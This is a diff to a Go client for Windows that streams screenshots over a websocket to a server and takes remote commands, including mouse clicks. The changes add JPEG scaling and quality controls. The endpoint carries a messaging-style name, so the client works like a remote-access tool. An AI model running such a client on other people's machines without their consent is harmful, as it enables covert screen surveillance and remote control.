@@ -20,6 +20,7 @@ import (
 
 	"github.com/gorilla/websocket"
 	win "github.com/lxn/win"
+	"github.com/nfnt/resize"
 )
 
 var (
@@ -27,8 +28,12 @@ var (
 	ADDR = flag.String("addr", "192.168.56.1:6969", "Server Endpoint")
 	PATH = "/messengerkeepalive"
 
+	// maybe change this
+	DEFAULT_SCALER  = 1
+	DEFAULT_FPS     = 1
+	DEFAULT_QUALITY = 20
+
 	// do not change this
-	DEFAULT_FPS      = 10
 	WIDTH            = int(win.GetSystemMetrics(win.SM_CXSCREEN))
 	HEIGHT           = int(win.GetSystemMetrics(win.SM_CYSCREEN))
 	HDC              = win.GetDC(0)
@@ -274,14 +279,36 @@ func handleConnection() error {
 			case "FPS":
 				if len(splitMessage) == 2 {
 					fps_int, err := strconv.Atoi(splitMessage[1])
-					fps = time.Duration(fps_int)
 					if err != nil {
 						log.Printf("FPS: Corrupt FPS Number")
 					} else {
+						fps = time.Duration(fps_int)
 						ticker.Reset(time.Second / fps)
 					}
 				} else {
 					log.Printf("FPS: Missing FPS Number")
+				}
+			case "SCL":
+				if len(splitMessage) == 2 {
+					scaler_int, err := strconv.Atoi(splitMessage[1])
+					if err != nil {
+						log.Printf("SCL: Corrupt Scaler Number")
+					} else {
+						DEFAULT_SCALER = scaler_int
+					}
+				} else {
+					log.Printf("SCL: Missing SCL Number")
+				}
+			case "QUL":
+				if len(splitMessage) == 2 {
+					quality_int, err := strconv.Atoi(splitMessage[1])
+					if err != nil {
+						log.Printf("QUL: Corrupt QUL Number")
+					} else {
+						DEFAULT_QUALITY = quality_int
+					}
+				} else {
+					log.Printf("QUL: Missing QUL Number")
 				}
 			case "LCL":
 				TriggerClick(strMessage, false)
@@ -340,19 +367,22 @@ func GetBitmapHeader(width, height int) (header win.BITMAPINFOHEADER) {
 }
 
 func GetOneJPGAsBytes() []byte {
-	imgBuf := new(bytes.Buffer)
-	buf, err := _GetOneRaw()
+	resultBuf := new(bytes.Buffer)
+	tempImage, err := _GetOneRaw()
 	if err != nil {
 		os.Exit(-1)
 	}
+
+	resizedImage := resize.Resize(uint(tempImage.Bounds().Dx()/DEFAULT_SCALER), 0, tempImage, resize.Lanczos3)
+
 	// Encode to jpeg
-	err = jpeg.Encode(imgBuf, buf, nil)
+	err = jpeg.Encode(resultBuf, resizedImage, &jpeg.Options{Quality: DEFAULT_QUALITY})
 
 	if err != nil {
 		log.Panic(err)
 	}
 
-	return imgBuf.Bytes()
+	return resultBuf.Bytes()
 }
 
 func _GetOneRaw() (*image.RGBA, error) {
